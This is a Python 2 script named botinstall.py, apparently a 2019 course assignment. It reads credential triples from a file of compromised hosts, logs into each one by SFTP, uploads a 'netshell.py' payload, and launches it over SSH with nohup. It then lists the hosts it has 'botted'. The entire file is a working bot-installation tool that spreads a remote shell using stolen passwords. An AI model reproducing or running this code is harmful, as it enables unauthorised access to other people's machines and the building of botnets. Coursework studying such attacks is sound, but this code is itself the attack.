#!/usr/bin/python2

# Additions by Kyle Healy for CPSC62700
# Due: 2/13/2019

import pexpect, sys

# Reads in a file and creates a list of hostname, username, password triples for each line in the file
def readHostInfoFromFile(fname):
    print "Read", fname
    hostInfo=[]
    with open(fname,'r') as f:
        for line in f:
            hostInfo.append(line.strip().split(" "))
    return hostInfo

def displayAttackMsg(hostInfo):
    print "Installing bots on the following hosts:"
    hosts = []
    for info in hostInfo:
        hosts.append(info[0])
    print hosts
    return

def sshInStartScript(host, user, password, uploadFileName):
    print "Starting sshInStartScript"
    retVal = False
    # construct the login string
    connStr = 'ssh ' + user + '@' + host
    # use 'spawn' to create the process.
    child = pexpect.spawn(connStr)
    ret = child.expect(['password', 'Could not resolve',
                        pexpect.EOF])
    if ret == 0:
        child.sendline(password)
        ret2 = child.expect(['\$','try again','publickey','closed'])
        if ret2==0:
            child.sendline()
            child.sendline("nohup ./{} &".format(uploadFileName))
            child.sendline()
            child.sendline("exit")
            retVal = True
        else:
            retVal = False
    return retVal

def uploadFileWithSFTP(hostInfo,uploadFileName):
    displayAttackMsg(hostInfo)

    bottedHosts = [];
    for info in hostInfo:
        host = info[0]
        user = info[1]
        password = info[2]
        # construct the login string
        connStr = 'sftp ' + user + '@' + host
        uploadScript=False

        try: 
            print "executing:", connStr
            # use 'spawn' to create the process.
            child = pexpect.spawn(connStr)

            ret = child.expect(['password','Could not resolve',
                                pexpect.EOF])
            if ret==0:
                print "Sending password {}".format(password)
                child.sendline(password)
                ret2 = child.expect(["sftp>","closed"])
                if ret==0:
                    putStr = "put {}".format(uploadFileName)
                    child.sendline(putStr)
                    ret3 = child.expect(["Uploading" ,"100%", "stat",pexpect.EOF])
                    if ret3==0 or ret3==1:
                        print "script uploaded"
                    else:
                        print "Error uploading script"
                    child.sendline()
                    child.sendline("!") #Exit script

                    uploadScript = sshInStartScript(host, user, password, uploadFileName)

                else:
                    print "Cannot connect SFTP: Host down"
                    continue
            else: #SFTP Failure
                print "SFTP Failure: Host down"
        except:
            print "Exception: Host down"
        else:
            if uploadScript:
                bottedHosts.append(host)

    return bottedHosts

def writeHostsToFile(hosts, filename):
    with open(filename, 'w') as f:
        for host in hosts:
            f.write(host + '\n')
    print filename, "written"

# Main program to run the botinstall.py code.
if __name__ == "__main__":
    print "Starting botinstall.py"
    fname = "compromised_hosts.txt"
    uploadFileName = "netshell.py"
    bottedHostsFilename = "botted_hosts.txt"
    hostInfo = readHostInfoFromFile(fname)
    bottedHosts = uploadFileWithSFTP(hostInfo,uploadFileName)
    writeHostsToFile(bottedHosts,bottedHostsFilename)
    print "Completed botinstall.py"
